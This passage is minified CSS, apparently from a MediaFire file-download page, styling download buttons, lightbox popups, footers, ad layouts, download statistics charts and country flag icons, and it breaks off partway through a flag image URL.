#goog-header-translate{background-image:url(/images/flags_svg/wal.svg)}.xh #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.yi #goog-header-translate{background-image:url(/images/flags_svg/isr.svg)}.yo #goog-header-translate{background-image:url(/images/flags_svg/nga.svg)}.zu #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.page{padding-top:10px;padding-bottom:70px;background:#fff;min-height:800px}.content{max-width:960px;margin:0 auto;position:relative;background:#fff}.social-cont{margin-top:7px;width:213px}.social-fb-cont{width:211px;border-radius:6px;background:#fff;border:1px solid #c5d0e3}.social-fb-cont>iframe{overflow:hidden;padding:15px 10px 0px;width:190px}.social-fb-cont>span{text-overflow:ellipsis;overflow:hidden;white-space:nowrap;display:block;color:#3c5a98;background:#e6e9f1 url(//static.mediafire.com/images/backgrounds/download/social/fb_16x16.png) no-repeat 10px center;border-bottom:1px solid #c5d0e3;height:35px;line-height:36px;font-size:12px;font-weight:600;border-radius:5px 5px 0 0;margin:0;text-indent:35px}#download-arrow{pointer-events:none;position:fixed;left:6px;bottom:0;z-index:9999;width:165px;height:229px;opacity:0;transition:opacity 0.2s;background-repeat:no-repeat;background-position:bottom;background-image:url(//static.mediafire.com/images/download/arrow_chrome.png)}#ParallelDL-optIn{background:#474747;border-radius:3px;color:white;font-size:10px;line-height:22px;float:right;clear:both;width:250px;text-align:center;margin-top:10px}#ParallelDL-optIn>span{padding:2px 5px;background:rgba(0,0,0,.5);border-radius:3px;margin-left:5px;text-transform:uppercase;font-size:9px}#ParallelDL-optIn:hover{background-color:#0070F0;background-color:var(--mf-blue4);color:#fff}.mobile #ParallelDL-optIn{display:none}#share{display:none;position:fixed;top:0;right:0;left:0;bottom:0;background:rgba(0,0,0,0.8);z-index:10000}#share figure{height:100%;margin:0;width:100%}#share.lightbox .close::after{right:22px;top:8px;width:30px;height:30px;border-radius:50%}@media (max-width:620px){#share.lightbox .close::after{right:10px;top:10px}}#share figcaption{height:100%;width:100%;background:transparent;padding:0}#share iframe{border:0;height:100%;width:100%;display:block}#mobile-turbo-dl-enable{display:none;position:fixed;top:0;right:0;left:0;bottom:0;background:rgba(0,0,0,0.8);z-index:10000}#mobile-turbo-dl-enable.lightbox .popup-container{background:#fff;position:fixed;margin:10px;padding:24px}#mobile-turbo-dl-enable.lightbox .popup-container .mobile-turbo-dl-enable-title{font-size:18px;display:block}#mobile-turbo-dl-enable.lightbox .popup-container .mobile-turbo-dl-enable-message{margin:12px 0;display:block;font-size:14px}#mobile-turbo-dl-btn-close{right:0;top:0;height:40px;width:40px;opacity:0.4;background:url(//static.mediafire.com/images/icons/svg_dark/close.svg) center / 20px no-repeat;position:absolute}#mobile-turbo-dl-btn-enable{box-sizing:border-box;flex-direction:row;justify-content:center;padding:8px 12px;gap:10px;height:40px;background:#FFFFFF;border:2px solid #D8DCDF;border-radius:4px;order:0;display:flex;align-items:center;text-align:center;text-transform:uppercase;color:var(--mf-gray4)}#mobile-turbo-dl-btn-cancel{margin-top:10px;flex-direction:row;justify-content:center;padding:8px 12px;gap:10px;background:var(--mf-blue4);border-radius:4px;line-height:24px;display:flex;align-items:center;text-align:center;text-transform:uppercase;color:#FFFFFF;order:1}.nonDLContentWrap{min-height:1500px}#ads{overflow:hidden;border:0;margin-bottom:50px}.ads-temp #ads,.ads-normal #ads,.spiralyze #ads{height:1450px}.ads-alternate .DLExtraInfo-wrap{position:absolute;top:738px;left:0}.ads-alternate .DLExtraInfo.DLExtraInfo-additional{margin-top:130px}.lightbox .h1,.lightbox .h2,.lightbox .h3,.lightbox .h4,.lightbox .h5,.lightbox .h6{font-weight:normal;line-height:1.4;margin-bottom:1rem}.lightbox .h1{font-size:2.9rem}.lightbox .h2{font-size:2.3rem}.lightbox .h3{font-size:1.9rem}.lightbox .h4{font-size:1.6rem}.lightbox .h5{font-size:1.3rem}.lightbox .h6{font-size:1rem;font-weight:bold}.lightbox .font-weight-normal{font-weight:normal!important}.lightbox .font-weight-bold{font-weight:bold!important}.lightbox .g-Btn{display:inline-flex;align-items:center;justify-content:center;border-radius:3px;font-family:'Open Sans',sans-serif;font-size:.79rem;font-weight:normal;cursor:pointer;height:auto;line-height:1.5;padding:6px 15px;border:0;outline:0;text-transform:uppercase;-webkit-appearance:none;box-sizing:border-box;min-height:36px}.lightbox .g-Btn--primary{color:#fff;background:#0070F0;background:var(--mf-blue4)}.lightbox .g-Btn--secondary{color:#575B65;color:var(--mf-gray4);background-color:#E9EAEB;background-color:var(--mf-gray10)}.lightbox .g-Btn--tertiary{color:#fff;background:#6c3}.lightbox .g-Btn--alt{color:#fff;background:#282f3d}.lightbox .g-Btn:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-ms-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-o-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05))}.lightbox .g-Btn--alt:hover{background-image:-webkit-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-moz-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-ms-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-o-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08))}.lightbox a.g-Btn--primary:hover,.lightbox a.g-Btn--tertiary:hover,.lightbox a.g-Btn--alt:hover{color:#fff}.lightbox a.g-Btn--secondary:hover{color:#575B65;color:var(--mf-gray4)}.lightbox .g-Icon{display:inline-block;vertical-align:middle;height:24px;width:24px;background-image:url(//static.mediafire.com/images/icons/svg_dark/icons_sprite.svg);background-repeat:no-repeat}.lightbox .g-Btn .g-Icon{margin:0 8px 0 -2px}.lightbox .dropdown .g-Icon{margin-right:8px;opacity:0.5}.lightbox .g-Icon--white{background-image:url(//static.mediafire.com/images/icons/svg_light/icons_sprite.svg)}.lightbox .g-Btn .g-Icon.g-Icon--right{margin:0 -2px 0 8px}.lightbox .g-Icon--arrowRight{background-position:-1632px 0}.lightbox{display:none}.lightbox.on,.lightbox:target{position:fixed;left:0;top:0;width:100%;height:100%;display:flex!important;align-items:center;justify-content:center;outline:none;overflow:auto;z-index:1000}.lightbox.on{background-color:rgba(0,0,0,.7)}.lightbox:not(:target,.on){display:none!important}.lightbox figure{margin:auto}.lightbox figcaption{position:relative;padding:2px;background-color:#fff;border-radius:5px;box-shadow:0 2px 10px 0 rgba(0,0,0,.35);z-index:1001}.lightbox .close{position:relative;display:block}.lightbox .close::after{right:0;top:0;height:40px;width:40px;border-radius:5px;opacity:0.4;background:url(//static.mediafire.com/images/icons/svg_dark/close.svg) center / 20px no-repeat;position:absolute;display:flex;z-index:1;align-items:center;justify-content:center;background-color:white;color:white;content:"";z-index:1002}.lightbox .close:hover:after{opacity:0.8}.lightbox .close::before{left:0;top:0;width:100%;height:100%;position:fixed;content:"";cursor:default;z-index:1000}.lightbox-title{font-size:18px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;padding:20px 30px;display:block}.lightbox-content{padding:0 30px 80px}.lightbox-content label{display:block;margin-bottom:5px;font-weight:bold}.lightbox-btns{padding:0px 15px 15px;position:absolute;bottom:0;right:0;left:0}.lightbox-btns .g-Btn{float:right;margin-left:10px}#footer{padding:0px;width:100%;background-color:#f3f3f3;height:auto;min-height:260px;color:#575B65;color:var(--mf-gray4);box-shadow:inset 0 1px 0px 0 rgba(0,0,0,.03)}#footer em{font-style:normal;font-weight:bold}#footer b{font-weight:normal}.footerColWrap{padding:30px 0 10px}.footerCol{width:25%;float:left;font-size:13px;padding-right:30px;box-sizing:border-box}.footerCol h2{display:block;padding:0 0 0px 0;margin-bottom:10px;font-family:'Open Sans',sans-serif;font-size:12px;position:relative;font-weight:600;text-transform:uppercase}#footer a{color:#575B65;color:var(--mf-gray4)}#footer a:hover{color:#222835;color:var(--mf-gray2)}#footerColFollow a{padding-left:24px}#footer .mflogo_footer{display:none;position:absolute;top:32px;left:0;height:16px;width:122px;padding:0;margin-top:-3px;text-align:center;background:url(//static.mediafire.com/images/v4images/backgrounds/mflogo_footer.png) right bottom no-repeat}#footer .mflogo_footer:hover{text-decoration:none}.myfiles #footer,.filePreview #footer,.fileEdit #footer,.appView #footer{height:0;min-height:0;position:fixed;bottom:0;background:#ebebeb;-webkit-box-shadow:0px -1px 0px 0px rgba(0,0,0,.15);box-shadow:0px -1px 0px 0px rgba(0,0,0,.15);-webkit-transition:height .3s ease 0s;-moz-transition:height .3s ease 0s;font-family:'Open Sans',sans-serif;z-index:20}#subFooterWrap{position:relative;border-top:1px solid #E3E3E3}.myfiles #subFooterWrap,.filePreview #subFooterWrap,.fileEdit #subFooterWrap{border:none}.myfiles #subFooterWrap:before,.filePreview #subFooterWrap:before,.fileEdit #subFooterWrap:before{display:none}#subFooter{position:relative;height:auto;padding:17px 0;clear:both;font-size:12px}.subFooterLinks{margin-right:124px}#subFooter li{display:inline;margin-right:20px;position:relative}#subFooter li:first-child:before,#subFooter li.footerIcn:before{display:none}#subFooter a{text-shadow:none}#subFooterSocialWrap{min-width:890px}#subFooterSocial{position:absolute;right:0;top:0}#subFooterSocial li{float:right;margin:12px 0 0 10px}.texasNote{display:none}.footerIcn a{display:block;position:relative;height:28px;width:28px;padding:0;border-radius:3px;-webkit-transition:background-color .2s linear;-moz-transition:background-color .2s linear;-ms-transition:background-color .2s linear;-o-transition:background-color .2s linear;transition:background-color .2s linear;background-color:rgba(0,0,0,0.1)}.footerIcn a:hover{background-color:#47A9EB}.footerIcn span{position:absolute;height:100%;width:100%;top:0;left:0;background-image:url(//static.mediafire.com/images/backgrounds/footer/social/footerIcons.png);background-repeat:no-repeat;cursor:pointer;opacity:.3}.footerIcnFb{background-position:0px top}.footerIcnTw{background-position:-28px top}.footerIcnBlog{background-position:-84px top}#subFooter li.myFilesFooterShow{display:none}.myfiles #subFooter li.myFilesFooterShow{display:block}.myfiles #subFooter .dropUp li{margin:0;display:block}.myfiles #subFooter .footerColWrap li:before,.filePreview #subFooter .footerColWrap li:before,.fileEdit #subFooter .footerColWrap li:before{display:none}#minSocialLinks{display:none}@media (max-width:960px){.footerCol{padding:0 30px}#subFooter{padding:17px 30px}#subFooterSocial{padding-right:30px}}@media (max-width:910px){#subFooterSocial{position:static;margin:0;float:left;width:auto;padding:20px 0}}@media (max-width:770px){.footerCol{width:auto;float:none;padding:10px 30px 0;border-bottom:1px solid #e8e9ec}.footerCol li{display:inline-block;margin-right:20px;font-size:12px;margin-bottom:10px}.footerColWrap{padding:0}#subFooterWrap{border:0}#subFooter{padding:30px}#subFooter li#copyrightInfo{display:block;margin:10px 0 30px 0}.subFooterLinks{margin:0}#subFooter li:not(.footerIcn){margin:0 20px 10px 0;display:inline-block}}.ads-temp .content,.ads-normal .content,.spiralyze .content{width:960px}.ads-normal .content,.ads-alternate .content{min-height:1500px}.ads .dl-btn-cont{width:auto;margin:0;border-radius:6px 6px 0 0}.ads-temp .ads .dl-btn-cont{width:auto;border-radius:6px;margin:0}.center{width:604px;height:580px;position:absolute;background:#fff;right:0;top:110px;overflow:hidden;overflow-y:auto;border-radius:6px}.spiralyze .center{height:610px}.dl-promo-cont{color:#fff;border-radius:0 0 6px 6px;box-shadow:inset 0 1px 0 0 rgba(255,255,255,.1);font-size:13px;text-align:center;position:relative;display:block;padding:8px;background:#474747 url(//static.mediafire.com/images/backgrounds/download/dl_promo_logo.png) 10px 8px no-repeat}.dl-promo-cont>span{position:absolute;right:5px;top:5px;height:26px;line-height:26px;padding:0 20px;background:#757575;text-transform:uppercase;font-size:10px;font-weight:bold;border-radius:3px}.dl-promo-cont:hover{color:#fff}.ads-temp .dl-promo-cont{max-width:600px;width:100%;height:34px;margin-left:auto;margin-right:auto;display:block;background:#fff;font-family:Open Sans,Sans-Serif;font-size:12px;line-height:34px;text-align:center;color:#0077ff;padding:0}.ads-temp .dl-promo-cont:hover{text-decoration:underline;color:#0077ff}#form_captcha .dl-utility-nav{display:none}.dl-info{position:relative;font-size:13px;line-height:18px;padding:20px 20px 0}.intro.icon{width:100%;background-position:0 0!important;height:50px;position:static;font-size:18px;line-height:22px;padding-top:8px;margin-bottom:20px}.intro>div{margin:0 240px 0 60px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.intro .filename{font-weight:300}.intro .filetype{font-weight:700;color:#000}.details{font-weight:bold;margin:0 240px 20px 0}.details span{font-weight:normal}.description-subheading{font-weight:bold}.description p{margin:0 240px 12px 0}.sidebar{position:absolute;right:0;width:213px;top:20px}.sidebar>div{padding:10px;background:#eee;margin-bottom:10px}.sidebar ul{margin-top:10px}.sidebar .filename{display:inline-block;font-weight:bold;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.apps>ul a{display:block;height:31px;padding-left:43px;font-size:11px;line-height:13px;margin-bottom:4px;padding-top:5px;position:relative;color:#0045AD;color:var(--mf-blue3)}.apps>ul a:before{content:"";position:absolute;top:0;left:0;height:36px;width:36px;background-image:url(//static.mediafire.com/images/backgrounds/download/apps_list_sprite-v6.png);background-repeat:no-repeat}.apps a[title="Windows Picture and Fax Viewer"]:before{background-position:0 0}.apps a[title="Adobe Photoshop"]:before{background-position:0 -36px}.apps a[title="Apple Preview"]:before{background-position:0 -72px}.apps a[title="AppleWorks"]:before{background-position:0 -72px}.apps a[title="Microsoft Word"]:before{background-position:0 -144px}.apps a[title="LibreOffice"]:before{background-position:0 -180px}.apps a[title="WinZip for PC"]:before{background-position:0 -216px}.apps a[title="WinZip for Mac"]:before{background-position:0 -324px}.apps a[title="7-Zip"]:before{background-position:0 -252px}.apps a[title="QuickTime"]:before{background-position:0 -288px}.apps a[title="Windows Media Player"]:before{background-position:0 0}.apps a[title="VideoLAN VLC Media Player"]:before{background-position:0 -360px}.apps a[title="Microsoft PowerPoint"]:before{background-position:0 -396px}.apps a[title="iZip"]:before{background-position:0 -468px}.apps a[title="iTunes"]:before{background-position:0 -540px}.apps a[title="Apache OpenOffice"]:before{background-position:0 -576px}.apps a[title="Sublime Text 2"]:before{background-position:0 -612px}.apps a[title="Notepad++"]:before{background-position:0 -648px}.apps a[title="Infix PDF Editor"]:before{background-position:0 -684px}.apps a[title="Adobe Reader"]:before{background-position:0 -720px}.apps a[title="Microsoft 365"]:before{background-position:0 -108px}.apps a[title="PaintShop Pro"]:before{background-position:0 -432px}.apps a[title="Roxio Creator"]:before{background-position:0 -504px}.apps a[title="WordPerfect Office"]:before{background-position:0 -756px}.apps a[title="Pinnacle Studio"]:before{background-position:0 -792px}.Download-compatibility>div{margin-bottom:15px}.Download-compatibility .g-Select{width:100%;padding-left:10px;margin-bottom:15px}.Download-compatibilityStatus{font-size:11px;line-height:14px}.Download-compatibilityStatus span{height:18px;width:18px;float:left}.Download-compatibilityStatus p{margin-left:28px}.Download-compatibilityStatus.is-compatible span{background:url(//static.mediafire.com/images/icons/svg_dark/check_circle_green.svg) center / 18px no-repeat}.Download-compatibilityStatus.is-notCompatible span{background:url(//static.mediafire.com/images/icons/svg_dark/close_circle_red.svg) center / 18px no-repeat}.DLMobile-upsellBox{display:none;margin:0 auto 50px;color:#ffffff;text-align:center;position:relative;z-index:1;max-width:450px}.DLMobile-upsellBox>div{background:#0045a6;padding:20px;margin:0 20px;box-sizing:border-box}.mobile.ads-mobileLegacy .DLMobile-upsellBox,.mobile.ads-mobile4 .DLMobile-upsellBox{display:block}.DLMobile-upsellBoxLogo{display:inline-block;margin:10px 0 15px;width:60px;height:60px;border-radius:50%;background:#07f url(//static.mediafire.com/images/backgrounds/header/mf_logo_u1_flame_reversed.svg) center / auto 26px no-repeat}.DLMobile-upsellBox p{font-size:17px;margin-bottom:20px}.DLMobile-upsellBox ul{margin:0 0 30px;text-align:left;list-style-type:disc;display:inline-block}.DLMobile-upsellBox a{display:block;border-radius:3px;padding:12px 0;background:#ff8637;color:#000;font:normal 14px/16px Arial,sans-serif;text-transform:uppercase}.spiralyze .DLExtraInfo-wrap,.ads-normal .DLExtraInfo-wrap{position:absolute;top:850px;left:0}.ads-mobileLegacy .dl_pro_upsell{display:none}.DLExtraInfo{box-sizing:border-box;margin-bottom:30px;padding-bottom:30px;border-bottom:2px solid #f4f4f5;display:flex;flex-direction:row;justify-content:space-between;flex-wrap:wrap;width:960px}.DLExtraInfo:last-child{border:0;margin-bottom:0;padding-bottom:0}.DLExtraInfo-groupHeading{color:#0070F0;color:var(--mf-blue4);font-size:24px;font-weight:normal;width:100%;margin:0 0 30px;padding:0 30px;box-sizing:border-box;display:none}.DLExtraInfo-sectionHeading{font-size:14px;margin:0 0 15px;width:100%;font-weight:bold}.DLExtraInfo-sectionSubHeading{margin:0;font-size:13px}.DLExtraInfo p{font-size:13px;line-height:1.4;margin-bottom:10px}.DLExtraInfo-column{display:flex;flex-wrap:wrap;flex:1;align-content:flex-start;padding:0 25px}.DLExtraInfo-column:first-child{padding-left:0}.DLExtraInfo-column:last-child{padding-right:0}.DLExtraInfo-row{display:flex;flex-wrap:wrap;padding:0 0 20px 0}.DLExtraInfo-sectionGraphic{background-color:#fff;height:96px;width:160px;box-shadow:inset 0 0 0 2px rgba(0,0,0,.06);margin:0 30px 15px 0;padding:20px;box-sizing:border-box;position:relative}.DLExtraInfo-sectionGraphicCenter{height:100%;width:100%;background-size:contain;background-position:center;background-repeat:no-repeat}.DLExtraInfo-sectionIcon{width:72px;height:72px;margin:0 30px 15px 0;background-size:contain;background-position:center;background-repeat:no-repeat}.DLExtraInfo-sectionDetails{flex:1;min-height:50px}.DLExtraInfo-statusOverlay{position:absolute;top:0;left:0;background:#fff;width:100%;height:100%;display:flex;justify-content:center;align-items:center;font-size:13px}.DLExtraInfo-statusOverlay div{padding:30px}.DLExtraInfo-sectionGraphic .DLExtraInfo-statusOverlay div{background:url(//static.mediafire.com/images/icons/svg_dark/image-broken-variant.svg) center / 24px no-repeat;opacity:.2}.DLExtraInfo-uploadLocationMap{height:227px;background:#4cacff;box-shadow:inset 0 0 0 2px rgba(0,0,0,.06);margin-bottom:30px;width:100%;position:relative}.DLExtraInfo-uploadLocationMapBg.Continent{background:#4cacff url(//static.mediafire.com/images/backgrounds/download/additional_content/world.svg) center / contain no-repeat}.DLExtraInfo-uploadLocationMap span{display:inline-block;padding:4px 8px;color:#fff;font-size:11px;background-color:rgba(0,0,0,.4);position:relative;z-index:1}.DLExtraInfo-uploadLocationRegion{background-position:center;background-size:contain;background-repeat:no-repeat;position:absolute;width:100%;height:100%;top:0;left:0}.DLExtraInfo-uploadLocationRegion.continent-na{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-na.svg)}.DLExtraInfo-uploadLocationRegion.continent-sa{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-sa.svg)}.DLExtraInfo-uploadLocationRegion.continent-eu{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-eu.svg)}.DLExtraInfo-uploadLocationRegion.continent-as{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg)}.DLExtraInfo-uploadLocationRegion.continent-af{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-af.svg)}.DLExtraInfo-uploadLocationRegion.continent-oc{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-oc.svg)}.DLExtraInfo-uploadLocationRegion.country-ru{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/country-ru.svg)}.DLExtraInfo-uploadLocationRegion.country-tr{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/country-tr.svg)}.DLExtraInfo-uploadLocation .DLExtraInfo-sectionGraphic{width:80px;height:50px;background-position:0 0;background-size:contain;background-repeat:no-repeat;background-color:transparent;box-shadow:none;margin-bottom:0}.DLExtraInfo-uploadLocation p{margin-bottom:0}.DLExtraInfo-virusTotal p span{color:#6c3}.DLExtraInfo-virusTotalImage{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/flag.svg)}.DLExtraInfo-uploadIsp .DLExtraInfo-sectionGraphicCenter{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/dt.svg)}.DLExtraInfo-accountStatusImage{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/mf_round.svg)}.DLExtraInfo-referrer .DLExtraInfo-sectionIcon{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/gh.svg)}.browser-android{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_android.png)}.browser-uc{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_uc.png)}.browser-chrome{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_chrome.svg)}.browser-edge{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_edge.svg)}.browser-firefox{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_firefox.svg)}.browser-ie{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_ie.svg)}.browser-opera{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_opera.svg)}.browser-safari{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_safari.svg)}.browser-samsung{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_samsung.svg)}.browser-unknown{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_unknown.svg)}.DLExtraInfo-downloadAppStatus.is-upToDate{color:#6c3}.DLExtraInfo-downloadAppStatus.is-outOfDate{color:#ef5939}.ExternalLink:after{content:"";display:inline-block;height:12px;width:12px;vertical-align:baseline;margin-left:4px;background:url(//static.mediafire.com/images/icons/svg_dark/external_link.svg) 0 1px no-repeat}p.DLExtraInfo-compatibilityStatus{width:100%;font-weight:bold;margin-bottom:30px}.DLExtraInfo-compatibilityStatus span{display:inline-block;height:18px;width:18px;background:#ddd;vertical-align:middle;margin-right:10px}.DLExtraInfo-compatibilityStatus.is-compatible span{background:url(//static.mediafire.com/images/icons/svg_dark/check_circle_green.svg) center / 18px no-repeat}.DLExtraInfo-compatibilityStatus.is-notCompatible span{background:url(//static.mediafire.com/images/icons/svg_dark/close_circle_red.svg) center / 18px no-repeat}.DLExtraInfo-compatibility .DLExtraInfo-sectionGraphic{height:160px}.DLExtraInfo-compatibility .DLExtraInfo-sectionGraphicCenter{background-image:url(//static.mediafire.com/images/backgrounds/download/additional_content/wikipedia_logo_v2.svg)}.DLExtraInfo-downloadChart{width:100%}.DLExtraInfo-downloadChartGraph{height:400px;background:#fff;border:2px solid hsl(225,9%,93%);border-bottom-color:#282f3d;box-sizing:border-box;padding-top:40px;display:flex;position:relative}.DLExtraInfo-downloadChartNumbers{display:flex;flex-direction:column;width:100%;justify-content:space-between;margin:0;padding:40px 0 0;box-sizing:border-box;position:absolute;bottom:0;top:0}.DLExtraInfo-downloadChartNumbers li{text-transform:uppercase;font-size:11px;color:#b2b7c4;display:flex;align-items:center}.DLExtraInfo-downloadChartNumbers li:last-child{visibility:hidden}.DLExtraInfo-downloadChartNumbers li span{width:60px;text-align:right;padding:0 15px;box-sizing:border-box;position:relative;top:-5px;height:0}.DLExtraInfo-downloadChartNumbers li:after{content:"";height:1px;background:rgba(0,0,0,.05);flex:1}.DLExtraInfo-downloadChartBars{display:flex;justify-content:space-around;align-items:flex-end;flex:1;padding-left:60px;position:relative}.DLExtraInfo-downloadChartBars div{width:12%;background:#6c3}.DLExtraInfo-downloadChartDays{display:flex;margin:10px 0 30px;padding-left:60px;justify-content:space-around}.DLExtraInfo-downloadChartDays li{flex:1;text-align:center;text-transform:uppercase;font-size:11px;color:#b2b7c4}.DLExtraInfo-downloadChartLegend{font-size:12px;font-style:italic;margin-bottom:50px}.DLExtraInfo-downloadChartLegend div{display:inline-block;height:16px;width:16px;background:#6c3;vertical-align:text-bottom}.DLExtraInfo-downloadChartLegend span{margin:0 8px}.DLExtraInfo-downloadList ul{margin:0;font-size:12px;width:100%;position:relative}.DLExtraInfo-downloadList li{border-bottom:1px solid #e8e9ec;padding:8px 0;display:flex;justify-content:space-between;word-break:break-all}.DLExtraInfo-downloadList li:last-child{border:none;padding-bottom:0}.DLExtraInfo-downloadTotalsDetail{background:#fff;border:2px solid hsl(225,9%,93%);display:flex;width:100%;position:relative}.DLExtraInfo-downloadTotalsDetailData,.DLExtraInfo-downloadTotalsDetailFiles{flex:1;padding:15px}.DLExtraInfo-downloadTotalsDetailData{border-right:2px solid hsl(225,9%,93%)}.DLExtraInfo-downloadTotalsDetail .DLExtraInfo-sectionSubHeading{font-weight:normal;margin-bottom:5px}.DLExtraInfo-downloadTotalsDetail span{font-size:30px;font-weight:300}.DLExtraInfo-downloadDataGraphic,.DLExtraInfo-downloadFilesGraphic{height:60px;width:60px;float:left;opacity:.1}.DLExtraInfo-downloadDataGraphic{background:url(//static.mediafire.com/images/icons/svg_dark/database.svg) 0 0 / 48px no-repeat}.DLExtraInfo-downloadFilesGraphic{background:url(//static.mediafire.com/images/icons/svg_dark/file_multiple.svg) 0 6px / 36px no-repeat}.ie10 .DLExtraInfo-uploadLocation .DLExtraInfo-sectionGraphic{float:left}.ie10 .DLExtraInfo-upload{clear:both}.ie10 .DLExtraInfo-column{margin-bottom:50px}.ie10 .DLExtraInfo-downloadChartNumbers li{height:16.666%;padding-top:2%;box-sizing:border-box;box-shadow:inset 0 1px 0 0 rgba(0,0,0,.05);margin-left:20px}.ie10 .DLExtraInfo-downloadChartNumbers li span{padding:0}.ie10 .DLExtraInfo-downloadChartNumbers li:after{display:none}.ie10 .DLExtraInfo-downloadChartBars{height:100%;font-size:0}.ie10 .DLExtraInfo-downloadChartBars div{display:inline-block;margin:0 3%}.ie10 .DLExtraInfo-downloadChartDays{font-size:0}.ie10 .DLExtraInfo-downloadChartDays li{display:inline-block;width:12%;margin:0 3%}.mobile .DLExtraInfo-wrap{max-width:450px;margin:0 auto 170px;position:relative}.mobile .DLExtraInfo{width:auto;margin-left:20px;margin-right:20px;padding-bottom:0;flex-direction:column}.mobile .DLExtraInfo-uploadLocation .DLExtraInfo-sectionGraphic{width:60px;margin-right:20px}.mobile .DLExtraInfo-uploadLocationMap{height:200px}.mobile .DLExtraInfo-row{flex-direction:column;width:100%}.mobile .DLExtraInfo-sectionHeading{font-size:14px;margin-bottom:10px}.mobile .DLExtraInfo-column{padding:0 0 20px;flex-direction:column}.mobile .DLExtraInfo-uploadLocation{flex-direction:row}.mobile .DLExtraInfo-upload.DLExtraInfo-column{padding-bottom:0}.mobile .DLExtraInfo-downloadChartGraph{height:250px}.flag-background{background-size:contain;background-position:50%;background-repeat:no-repeat}.flag{background-size:contain;background-position:50%;background-repeat:no-repeat;position:relative;display:inline-block;width:1.33333333em;line-height:1em}.flag:before{content:"\00a0"}.flag-1x{width:1.33333333em;line-height:1em}.flag-2x{width:2.66666667em;line-height:2em}.flag-3x{width:4em;line-height:3em}.flag-4x{width:5.33333333em;line-height:4em}.flag-5x{width:6.66666667em;line-height:5em}.flag-6x{width:8em;line-height:6em}.flag-7x{width:9.33333333em;line-height:7em}.flag-8x{width:10.66666667em;line-height:8em}.flag-9x{width:12em;line-height:9em}.flag-10x{width:13.33333333em;line-height:10em}.flag-rotate-90{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.flag-rotate-180{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2);-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.flag-rotate-270{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3);-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.flag-flip-horizontal{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=0,mirror=1);-webkit-transform:scale(-1,1);-ms-transform:scale(-1,1);transform:scale(-1,1)}.flag-flip-vertical{filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2,mirror=1);-webkit-transform:scale(1,-1);-ms-transform:scale(1,-1);transform:scale(1,-1)}:root .flag-rotate-90,:root .flag-rotate-180,:root .flag-rotate-270,:root .flag-flip-horizontal,:root .flag-flip-vertical{filter:none}.flag-abw,.flag-aw,.flag-533,.flag-ioc-aru,.flag-fifa-aru{background-image:url(//static.mediafire.com/images/flags_svg/abw.svg)}.flag-afg,.flag-af,.flag-4,.flag-ioc-afg,.flag-fifa-afg{background-image:url(//static.mediafire.com/images/flags_svg/afg.svg)}.flag-ago,.flag-ao,.flag-24,.flag-ioc-ang,.flag-fifa-ang{background-image:url(//static.mediafire.com/images/flags_svg/ago.svg)}.flag-aia,.flag-ai,.flag-660,.flag-ioc-aia,.flag-fifa-aia{background-image:url(//static.mediafire.com/images/flags_svg/aia.svg)}.flag-ala,.flag-ax,.flag-248,.flag-fifa-ald{background-image:url(//static.mediafire.com/images/flags_svg/ala.svg)}.flag-alb,.flag-al,.flag-8,.flag-ioc-alb,.flag-fifa-alb{background-image:url(//static.mediafire.com/images/flags_svg/alb.svg)}.flag-and,.flag-ad,.flag-20,.flag-ioc-and,.flag-fifa-and{background-image:url(//static.mediafire.com/images/flags_svg/and.svg)}.flag-are,.flag-ae,.flag-784,.flag-ioc-uae,.flag-fifa-uae{background-image:url(//static.mediafire.com/images/flags_svg/are.svg)}.flag-arg,.flag-ar,.flag-32,.flag-ioc-arg,.flag-fifa-arg{background-image:url(//static.mediafire.com/images/flags_svg/arg.svg)}.flag-arm,.flag-am,.flag-51,.flag-ioc-arm,.flag-fifa-arm{background-image:url(//stati